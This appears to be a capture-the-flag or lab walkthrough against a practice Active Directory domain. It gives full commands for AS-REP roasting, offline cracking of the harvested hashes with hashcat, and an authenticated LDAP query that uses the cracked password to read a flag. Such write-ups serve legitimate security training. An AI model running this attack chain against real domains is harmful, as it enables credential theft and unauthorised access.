
### Our first mission is: Enumerate accounts with Kerberos pre-authentication disabled and request AS-REP tokens without authentication

Blueprint:
`impacket-GetNPUsers [1. Domain]/ -dc-ip [2. Target DC IP] -usersfile [3. Username Wordlist] -format [4. Output Format] -outputfile [5. Hash File]`

Command:

```bash
impacket-GetNPUsers PENTESTLAB.local/ -dc-ip 192.168.56.20 -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

```

Explanation:

`impacket-GetNPUsers`: Executes the Impacket component dedicated to identifying and querying domain accounts that have the `DONT_REQ_PREAUTH` (DoesNotRequirePreAuth) flag enabled in their User Account Control (UAC) settings.

`PENTESTLAB.local/`: Targets the specified domain root scope. Leaving the username blank allows the tool to attempt unauthenticated assertions against the Kerberos Key Distribution Center (KDC).

`-dc-ip 192.168.56.20`: Explicitly identifies the target network location of the Domain Controller to handle the authentication requests.

`-usersfile users.txt`: Inputs the previously generated list of valid domain usernames to systematically check each identity.

`-format hashcat -outputfile asrep_hashes.txt`: Generates the resulting data output in a raw formatting standard optimized for seamless ingest into offline cracking tools.

Brief Explanation:

> "Query the Kerberos KDC without active authentication pairs by leveraging the structural omission of pre-authentication requirements on specific accounts. When an infrastructure component disables this defense for compatibility, the KDC responds to initial authentication requests by returning an AS-REP packet encrypted with the target account's master key structure. This exposes a completely unauthenticated entry vector for offline data extraction."

---

### Our next mission is: Perform a dictionary attack against the recovered Kerberos token structure

Blueprint:
`hashcat -a [1. Attack Mode] -m [2. Hash Type Mode] [3. Target Hash File] [4. Wordlist Path]`

Command:

```bash
hashcat -a 0 -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

```

Explanation:

`hashcat`: Initiates the optimized multi-threaded password recovery processing array.

`-a 0`: Directs the application to execute a standard straight wordlist processing pass.

`-m 18200`: Instructs the engine to process incoming data tokens using the standard cryptographic definitions assigned to Kerberos 5 AS-REP etype 23 strings.

`asrep_hashes.txt`: Loads the file path containing the harvested authentication payloads isolated during the KDC query phase.

`/usr/share/wordlists/rockyou.txt`: Feeds the wordlist matrix into the local hashing process to evaluate potential password candidates against the key.

Brief Explanation:

> "Execute a fast offline cryptographic brute-force routine over the isolated AS-REP response string to recover the structural plain text password. Because the target identity's unique secret is the primary key used to secure the ticket data blob, a successful validation check immediately surfaces the cleartext credentials. This yields the valid account access key `Baseball1` for the `jmartin` user profile without generating active log signals on the active network perimeter."

---

### Our final mission is: Query target directory attributes using the compromised credentials to locate structural flags

Blueprint:
`nxc ldap [1. Target IP] -u '[2. Target Username]' -p '[3. Discovered Password]' --base-dn '[4. Domain context]' --query "([5. Identity Filter])" "[6. Target Attributes]"`

Command:

```bash
nxc ldap 192.168.56.20 -u 'jmartin' -p 'Baseball1' --base-dn "DC=PENTESTLAB,DC=local" --query "(sAMAccountName=jmartin)" "cn employeeType"

```

Explanation:

`nxc ldap`: Loads the NetExec infrastructure scanning platform's directory service automation module.

`-u 'jmartin' -p 'Baseball1'`: Signs in to the remote domain database using the successfully cracked developer account credentials.

`--base-dn "DC=PENTESTLAB,DC=local"`: Targets the search anchor directly at the base of the enterprise directory directory partition tree.

`--query "(sAMAccountName=jmartin)"`: Uses an explicit structural filtering string to limit object parsing logic exclusively to the targeted developer's account record row.

`"cn employeeType"`: Requests the target directory engine to selectively display the Canonical Name object details alongside the contents of the structural organizational attribute.

Brief Explanation:

> "Authenticate explicitly to the active LDAP directory service using the compromised developer identity to crawl configuration schema records. Internal target indicators or operational infrastructure flags are regularly stored within non-standard schema metadata properties, including deployment definitions or custom administrative slots. Querying the targeted `employeeType` attribute variables extracts the operational flag value safely out of the directory index."

Interaction Workflow & Retrieval:

```text
LDAP        192.168.56.20   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:PENTESTLAB.local) (signing:None) (channel binding:No TLS cert) 
LDAP        192.168.56.20   389    DC01             [+] PENTESTLAB.local\jmartin:Baseball1 
LDAP        192.168.56.20   389    DC01             [+] Response for object: CN=Jordan Martin,OU=BH-Users,OU=BH-Project,DC=PENTESTLAB,DC=local
LDAP        192.168.56.20   389    DC01             cn                   Jordan Martin
LDAP        192.168.56.20   389    DC01             employeeType         BHFLAG3{4S_R3P_J0RD4N_M4RT1N_F3}

```
